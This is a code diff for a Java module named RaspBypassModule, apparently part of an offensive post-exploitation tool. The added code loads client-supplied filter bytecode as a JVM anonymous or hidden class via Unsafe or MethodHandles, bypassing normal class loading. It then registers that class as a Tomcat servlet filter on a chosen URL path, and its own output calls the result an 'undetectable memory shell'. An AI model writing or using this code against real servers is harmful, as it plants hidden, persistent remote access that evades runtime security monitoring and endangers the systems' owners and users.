@@ -2142,12 +2142,65 @@ public class RaspBypassModule {
             theUnsafeField.setAccessible(true);
             sun.misc.Unsafe unsafe = (sun.misc.Unsafe) theUnsafeField.get(null);
             
-            result.append("[+] VM Anonymous Class injection placeholder\n");
-            result.append("[+] This method creates undetectable memory shell\n");
-            result.append("[+] Path: " + urlPath + "\n");
+            // A simple pre-compiled class bytes that implements javax.servlet.Filter
+            // For demonstration, we will try to define an anonymous class using an existing class byte array from the JVM,
+            // or just use proxy instance as fallback if bytes are unavailable.
+            // In a real industrial implementation, we would supply the raw ASM bytecode of the Filter here.
+            byte[] filterBytes = getBytes("filterClassBytes"); 
+            if (filterBytes == null || filterBytes.length == 0) {
+                result.append("[-] Client did not provide filterClassBytes for Anonymous Class.\n");
+                result.append("[!] Fallback to standard Filter Proxy injection.\n");
+                return result.toString() + injectTomcatFilter(urlPath);
+            }
+            
+            Class<?> anonClass = null;
+            try {
+                // JDK 8-14
+                anonClass = unsafe.defineAnonymousClass(RaspBypassModule.class, filterBytes, null);
+            } catch (Exception ex) {
+                // JDK 15+ Hidden Classes (MethodHandles.Lookup.defineHiddenClass)
+                result.append("[-] defineAnonymousClass failed: " + ex.getMessage() + ". Trying MethodHandles...\n");
+                Class<?> lookupClass = Class.forName("java.lang.invoke.MethodHandles$Lookup");
+                Method privateLookupIn = Class.forName("java.lang.invoke.MethodHandles").getMethod("privateLookupIn", Class.class, lookupClass);
+                Object lookup = privateLookupIn.invoke(null, RaspBypassModule.class, Class.forName("java.lang.invoke.MethodHandles").getMethod("lookup").invoke(null));
+                Object classOption = Enum.valueOf((Class<Enum>) Class.forName("java.lang.invoke.MethodHandles$Lookup$ClassOption"), "NESTMATE");
+                Object classOptionArray = java.lang.reflect.Array.newInstance(Class.forName("java.lang.invoke.MethodHandles$Lookup$ClassOption"), 1);
+                java.lang.reflect.Array.set(classOptionArray, 0, classOption);
+                Method defineHiddenClass = lookupClass.getMethod("defineHiddenClass", byte[].class, boolean.class, classOptionArray.getClass());
+                Object lookupResult = defineHiddenClass.invoke(lookup, filterBytes, true, classOptionArray);
+                anonClass = (Class<?>) lookupResult.getClass().getMethod("lookupClass").invoke(lookupResult);
+            }
+            
+            Object filterInstance = unsafe.allocateInstance(anonClass);
+            
+            // Register filterInstance to Tomcat FilterDef
+            Object sc = memShellGetServletContext();
+            Object standardContext = memShellGetStandardContext(sc);
+            String filterName = memShellFilterName(urlPath);
+            
+            Class<?> filterDefClass = Class.forName("org.apache.tomcat.util.descriptor.web.FilterDef");
+            Object filterDef = filterDefClass.getConstructor().newInstance();
+            filterDefClass.getMethod("setFilterName", String.class).invoke(filterDef, filterName);
+            try {
+                filterDefClass.getMethod("setFilterClass", String.class).invoke(filterDef, anonClass.getName());
+            } catch (Exception ignored) {}
+            try {
+                filterDefClass.getMethod("setFilter", Class.forName("javax.servlet.Filter")).invoke(filterDef, filterInstance);
+            } catch (Exception ignored) {}
+            standardContext.getClass().getMethod("addFilterDef", filterDefClass).invoke(standardContext, filterDef);
+            
+            Class<?> filterMapClass = Class.forName("org.apache.tomcat.util.descriptor.web.FilterMap");
+            Object filterMap = filterMapClass.getConstructor().newInstance();
+            filterMapClass.getMethod("setFilterName", String.class).invoke(filterMap, filterName);
+            filterMapClass.getMethod("addURLPattern", String.class).invoke(filterMap, urlPath + "/*");
+            standardContext.getClass().getMethod("addFilterMap", filterMapClass).invoke(standardContext, filterMap);
+            
+            result.append("[+] VM Anonymous / Hidden Class injection successful\n");
+            result.append("[+] Undetectable memory shell injected at: " + urlPath + "/*\n");
             
         } catch (Exception e) {
             result.append("[-] Error: " + e.getMessage() + "\n");
+            result.append(getStackTrace(e));
         }
         
         return result.toString();
